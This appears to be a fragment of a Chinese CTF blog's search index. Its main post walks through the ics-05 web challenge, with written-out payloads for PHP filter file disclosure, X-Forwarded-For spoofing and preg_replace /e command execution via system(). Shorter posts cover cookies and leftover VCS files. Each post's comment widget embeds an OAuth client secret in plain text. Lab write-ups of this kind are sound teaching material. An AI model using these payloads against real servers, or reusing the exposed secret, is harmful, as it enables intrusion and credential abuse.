      <content type="html"><![CDATA[<div class="note info"><p>0x01 前要</p></div>

<p>1.<a href="https://www.cnblogs.com/likai/archive/2010/01/29/1659336.html" target="_blank">php内置封装协议 filter</a><br>2.伪造IP<br>3.preg_replace()函数的/e漏洞<br>4.正确的php system()函数的书写</p>
 <a id="more"></a>


<div class="note info"><p>0x02 解题流程与思路</p></div>
1.打开题目网页点击尝试，发现只有维护中心可以点击

<p><img src="1.png" alt=""></p>
<br>

<ol start="2">
<li>F12查看源代码，可以看到代码段?page=index，同时网页表现为 xxxx/index.php，此时可以猜测题目可能为文件包含读取网页的漏洞。利用php内置filter协议协助网页传参，查看结果。</li>
</ol>
<br>
2_1.
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li class=<span class="string">"layui-nav-item layui-this"</span>&gt;&lt;a href=<span class="string">"?page=index"</span>&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure></div>
2_2.为了能够正常读取到内置文件的内容，所以采用base64模式提前将php内置文件源码我们所需的部分转化为base64形式，取得代码后在线转码即可获得源码。
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></div>

<p><img src="2.PNG" alt=""></p>
<br>

<p>3.转码获得源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$pattern</span>) &amp;&amp; isset(<span class="variable">$replacement</span>) &amp;&amp; isset(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
<p>3_1.代码审计<br>（1）我们需要从127.0.0.1 IP地址登陆，使用Burp Suite伪造html头IP<br>（1_1）可以看到我们登陆成功<br><img src="3.PNG" alt=""></p>
<p>（2）<a href="https://blog.csdn.net/ww122081351/article/details/17579851" target="_blank">preg_replace危险的/e修饰符</a><br>    简单的说明一下preg_replace（）函数，详细的说明以及示例可以点击超链接，阅读另一位博主的详细说明</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">preg_replace (<span class="variable">$pattern</span> , <span class="variable">$replacement</span> ,  <span class="variable">$subject</span> [, int <span class="variable">$limit</span> = -1 [, int &amp;<span class="variable">$count</span> ]] )</span><br><span class="line"><span class="variable">$pattern</span>:       搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line"><span class="variable">$replacement</span>:   用于替换的字符串或字符串数组。</span><br><span class="line"><span class="variable">$subject</span>:       要搜索替换的目标字符串或字符串数组。</span><br><span class="line">关于/e：</span><br><span class="line"> 当pattern中有/e是代表preg_replace()函数的/e时，subject中匹配到的pattern会将replacement当作代码执行。</span><br><span class="line"> 潜在威胁： 当replacement为可控时，可以直接编写一句话木马</span><br></pre></td></tr></table></figure></div>
<p>（2_2）利用漏洞寻找flag<br>    %20代表空格，%26%26就是&amp;&amp;代表当前面命令执行成功时，继续执行后面的命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
<p><img src="4.PNG" alt=""></p>
<p>(2_3)根据文件目录，查看可疑文件layui和s3chahahaDir，通过cd到文件夹，查看文件内容，最终确认为s3chahahaDir文件夹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cd%20s3chahahaDir%26%26%20ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
<p><img src="5.PNG" alt=""><br>（2_4）找到flag文件夹后，继续cd，寻找所需的flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cd%20s3chahahaDir/flag%26%26%20ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
<p><img src="6.PNG" alt=""><br>(2_5)确认flag所在的文件，直接抓取内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cat%20s3chahahaDir/flag/flag.php"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
<p><img src="7.PNG" alt=""><br>成功找到flag</p>
<div class="note info"><p>0x03 解题过程中存在的问题</p></div>
1.Burp Suite存在复制黏贴产生报错结果，建议可以手打重新尝试



<div class="note info"><p>0x04 参考</p></div>
1.<a href="https://blog.csdn.net/zhwho/article/details/100694073" target="_blank">攻防世界web进阶ics-05 wp</a><br>
2.<a href="https://blog.csdn.net/ww122081351/article/details/17579851" target="_blank">preg_replace危险的/e修饰符</a><br>
3.<a href="https://blog.csdn.net/About23/article/details/95349625" target="_blank">攻防世界ics-5wp</a><br>



<!-- Link Gitalk 的支持文件  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk的主要参数
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
]]></content>
      
        <categories>
            
            <category> CTF-WEB </category>
            
        </categories>
        
        
        <tags>
            
            <tag> php内置filter协议 </tag>
            
            <tag> 伪造IP </tag>
            
            <tag> preg_replace()函数的/e漏洞 </tag>
            
            <tag> 正确的php system()函数的书写 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF攻防世界-WEB-cookie基础题]]></title>
      <url>/2019/12/24/pb%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<div class="note info"><p>0x01 攻防世界web新手区cookie题</p></div>
    常规网上搜到的都是用burp suits做的，其实没必要这么麻烦，查看问题的讨论发现可以直接通过火狐浏览器 F12查看存储，获得cookie，然后查看网络获得flag <br>
    Chrome浏览器可以通过控制台输入alert(document.cookie)查看cookie cookie
<div class="note info"><p>0x02 图流程</p></div>

<p><img src="2.png" alt=""></p>
<p><img src="1.png" alt=""></p>
<!-- Link Gitalk 的支持文件  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk的主要参数
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
]]></content>
      
        <categories>
            
            <category> CTF-WEB基础 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 抓包基础题 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[低估的Web威胁-备份文件]]></title>
      <url>/2019/12/24/CTF-python3%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8/</url>
      <content type="html"><![CDATA[<div class="note info"><p>0x01二进制转字符串</p></div>
<details>
<summary>二进制转字符串</summary>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line"># gif 二进制转字符串</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">a &#x3D; &#39;01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101&#39;</span><br><span class="line">b &#x3D; re.findall(r&#39;.&#123;8&#125;&#39;,a)</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in b:</span><br><span class="line">    flag +&#x3D; chr(int(i,2))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></div>
</details>


<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;div class=<span class="string">"note danger"</span>&gt;&lt;p&gt;0x02没有删除版本控制系统产生的备份文件&lt;/p&gt;&lt;/div&gt;</span><br><span class="line">	几乎所有的控制系统VCS都会在工程目录下建一个meta目录，这个文件记录了整个项目工程每次修改的记录。</span><br><span class="line">而开发者修改项目仓库的时候就直接下载/克隆代码仓库，改为后直接上传到web服务器上。但是很多时候，VCS产生的目录并没有删除掉，这样的话，如果被攻击者找到，将会使整个工程泄露。</span><br><span class="line"></span><br><span class="line">&#123;% note default %&#125; default &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
      
        <categories>
            
            <category> CTF-WEB </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python3 工具合集 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
